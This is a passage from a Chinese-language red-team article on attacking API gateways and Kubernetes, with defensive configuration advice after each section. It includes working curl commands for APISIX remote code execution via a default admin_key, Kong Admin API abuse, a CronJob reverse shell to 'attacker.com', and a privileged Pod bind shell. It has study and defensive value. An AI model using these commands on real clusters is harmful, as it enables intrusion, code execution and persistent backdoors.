
```bash
# 1. 创建一个Service指向内网目标
curl -i -X POST http://kong-admin-api:8001/services/ \
  --data "name=internal-service" \
  --data "url=http://internal-target.com:443"

# 2. 创建一个Route将外部请求路由到该Service
curl -i -X POST http://kong-admin-api:8001/services/internal-service/routes \
  --data "paths[]=/internal" \
  --data "hosts[]=target.com"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiaxerLLF2Lib6bAylq9yJDuxgYKKhEHdljWZRqe0bhoF3mQc3ydxZQZA/640?wx_fmt=png)

至此，蓝军从外网发往 Kong Proxy 的流量只要 host 头带有 target.com 就会转发到内网的 target.com:443 中，实际利用手法会根据内网和目标站点配置的不同而变化。

而目前 Kong 的开源分支里是不支持给 Kong Admin Rest API 添加相应的鉴权能力的，只可以改变监听的网卡，或使用设置 Network Policy、 iptables、安全组等方式进行网络上隔离。现在最常见的方式就是不开放外网，只允许内网访问。也因为如此，如果已经进入到内网，API 网关的管理接口会成为我首要的攻击目标之一，借此我们可以摸清当前集群对内对外提供的相关能力，更有可能直接获取流量出入口容器的 Shell 权限。

**Kong API网关安全配置**：

1. **网络隔离**
   - 将Kong Admin API限制在内部网络
   - 使用反向代理(如Nginx)提供额外的访问控制
   - 实施网络策略限制对Admin API的访问
   ```bash
   # 配置Kong仅监听本地接口
   admin_listen = 127.0.0.1:8001
   ```

2. **使用Kong Admin API密钥**
   - 在开源版中配置KONG_ADMIN_LISTEN和KONG_ADMIN_API_URI
   - 使用自定义Nginx配置添加基本认证
   ```nginx
   server {
     listen 8001;
     location / {
       access_by_lua_block {
         local key = ngx.req.get_headers()["apikey"]
         if not key or key ~= "YOUR_SECRET_KEY" then
           return ngx.exit(401)
         end
       }
       proxy_pass http://localhost:8001;
     }
   }
   ```

3. **使用API网关保护Admin API**
   - 使用Kong自身作为Admin API的网关
   - 配置密钥认证插件
   ```bash
   # 创建Admin API服务
   curl -i -X POST http://localhost:8001/services \
     --data name=admin-api \
     --data url=http://localhost:8001
   
   # 创建路由
   curl -i -X POST http://localhost:8001/services/admin-api/routes \
     --data 'paths[]=/admin-api'
   
   # 启用密钥认证插件
   curl -i -X POST http://localhost:8001/services/admin-api/plugins \
     --data "name=key-auth"
   ```

4. **监控和审计**
   - 启用Kong的请求日志
   - 实施集中日志收集和分析
   - 监控异常的API调用模式

## 12.1. APISIX 的 RCE 利用

另外一个值得深入的开源组件就是 Apache APISIX，这是一款基于 lua 语言开发，是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。

APISIX 提供了 REST Admin API 功能，用户可以使用 REST Admin API 来管理 APISIX，默认情况下只允许 127.0.0.1 访问，用户可以修改 conf/config.yaml 中的 allow_admin 字段，指定允许调用 Admin API 的 ip 列表。

当用户对外开启了 Admin API 且未修改硬编码的缺省 admin_key 的情况下，攻击者可以利用该 admin_key 执行任意 lua 代码。

```yaml
# 默认的admin_key配置
admin:
  admin_key:
    - name: admin
      key: edd1c9f034335f136f87ad84b625c8f1  # 默认密钥，应当修改
      role: admin
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfto8mHNHeB77LoDPhFESbBegaNiaib0BALNkDWrh3x1EBAdoK89x01Hq1w/640?wx_fmt=png)

根据 apisix 官方文档可以知道，在创建路由时用户可以定义一个 filter_func 参数用于处理请求，filter_func 的内容可以是任意的 lua 代码。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftIfSbPDUz124AichVhhvGTaueXiba0Ja0E4ZyFYZRQWOp9yfsRCpRDlAA/640?wx_fmt=png)

那么我们便可以使用默认的 admin_key 创建恶意的 route 并访问以触发 lua 代码执行，达到 rce 的目的，下面是具体步骤：

**（1）创建可用的 services:**

```bash
curl -i -X PUT http://127.0.0.1:9080/apisix/admin/services/1 \
-H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1" \
-d '{
    "upstream": {
        "nodes": {
            "127.0.0.1:80": 1
        },
        "type": "roundrobin"
    }
}'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftst9v4ibA2LYdvG3nqMhTHDicGqXvKq7PmofK2tK15SPF6DNVMLWf8BJw/640?wx_fmt=png)

**（2）创建恶意的 route:**

```bash
curl -i -X PUT http://127.0.0.1:9080/apisix/admin/routes/1 \
-H "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1" \
-d '{
    "uri": "/api/tforce_test",
    "script": "local function hello() os.execute(\"touch /tmp/success\") end hello()",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "127.0.0.1:1980": 1
        }
    }
}'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftLVN26q4XLteqAicQINLQ2bBY9jmnP0Jp3hCf5Jn9WriaXiagfaibMYLl8A/640?wx_fmt=png)

最后访问 http://127.0.0.1:9080/api/tforce_test 即可触发预定义的 lua 代码执行。

因此，在内网里攻击云原生 API 网关是比较容易打开一定局面的。

**APISIX安全配置**：

1. **修改默认admin_key**
   - 立即更改默认的admin_key
   - 使用强密码生成器创建复杂密钥
   ```yaml
   admin:
     admin_key:
       - name: admin
         key: your_strong_random_key_here  # 替换默认密钥
         role: admin
   ```

2. **限制Admin API访问**
   - 严格控制allow_admin列表
   - 仅允许必要的IP地址访问
   ```yaml
   admin:
     allow_admin:
       - 127.0.0.0/24
       - 192.168.1.0/24  # 仅允许特定内网IP访问
   ```

3. **实施TLS加密**
   - 为Admin API配置TLS证书
   - 强制使用HTTPS访问
   ```yaml
   admin:
     https_admin: true
     admin_listen:
       ip: 127.0.0.1
       port: 9443
     ssl:
       cert: /path/to/cert.pem
       key: /path/to/key.pem
   ```

4. **定期审计路由配置**
   - 监控路由创建和修改
   - 检查可疑的filter_func和script配置
   - 实施变更管理流程

## 13. 其它利用场景和手法

## 13.1. 从 CronJob 谈持久化

因为 CronJob 的设计和 Linux CronTab 过于相似，所以很多人都会把其引申为在 Kubernetes 集群攻击的一些持久化思路。  

官方文档

https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ 里也谈及了 CronJob 和 CronTab 的对比， 这个技术也确实可以和 CronTab 一样一定程度上可以满足持久化的场景。

这里有一个我们预研时使用的  CronJob 配置：

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor-cronjob
spec:
  schedule: "*/1 * * * *"  # 每分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor
            image: alpine:latest
            command:
            - /bin/sh
            - -c
            - "echo 'Starting backdoor'; nc -e /bin/sh attacker.com 4444"
            securityContext:
              privileged: true  # 特权容器
          restartPolicy: OnFailure
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftrrCeuxvK2FlC1SVIZx0jOQOrVfgibPg7Acwq8xadYojuKht8HvebhyQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftWJSdjSw4orHiagibFcg9JWAE78DBABCVudY6DVfAHKs6ibbKQntYicsjFQ/640?wx_fmt=png)

此处的配置会隔每分钟创建一个具有生命周期的 POD，同时这些容器也可以使用特权容器（如上述配置）、挂载大目录等设置，此时持久化创建的 POD 就可以拥有特权和访问宿主机根目录文件的权限。

不过实际对抗过程中，虽然我们也会对恶意的 POD 和容器做一定的持久化，但是直接使用 CronJob 的概率却不高。在创建后门 POD 的时候，直接使用 restartPolicy: Always 就可以方便优雅的进行后门进程的重启和维持，所以对 CronJob 的需求反而没那么高。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: persistent-backdoor
spec:
  containers:
  - name: backdoor
    image: alpine:latest
    command: ["/bin/sh", "-c", "while true; do nc -lvp 4444 -e /bin/sh; sleep 10; done"]
    securityContext:
      privileged: true
  restartPolicy: Always  # 容器退出后自动重启
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftVUtO0jicZWfyBIVotbJ1D2uhQ3slMibqowUq21tdNoPlZeHQciauJN0Fw/640?wx_fmt=png)

**防御建议**：
- 监控CronJob和Pod创建活动
- 实施Pod Security Policies限制容器权限
- 定期审计集群中的CronJob配置
- 使用准入控制器验证新创建的Pod和CronJob
- 实施网络策略，限制容器的出站连接

## 14. 致谢

[WIP]

也感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。

## 15. 引用

1.  https://github.com/cdk-team/CDK/
2.  https://force.tencent.com/docs/CIS2020-Attack-in-a-Service-Mesh-Public.pdf?v=1
3.  https://github.com/cncf/toc/blob/master/DEFINITION.md
4.  https://www.cncf.io/blog/2017/04/26/service-mesh-critical-component-cloud-native-stack/
5.  https://github.com/lxc/lxcfs
6.  https://github.com/cdr/code-server
7.  https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands
8.  https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html
9.  https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186
10.  https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs-
11.  https://security.tencent.com/index.php/announcement/msg/193
12.  https://www.freebuf.com/vuls/196993.html
13.  https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
14.  https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet/
15.  https://www.cdxy.me/?p=827
16.  https://medium.com/jorgeacetozi/kubernetes-master-components-etcd-api-server-controller-manager-and-scheduler-3a0179fc8186
17.  https://github.com/neargle/CVE-2018-6574-POC
18.  https://www.serverless.com/blog/serverless-faas-vs-containers/
19.  https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands
20.  https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
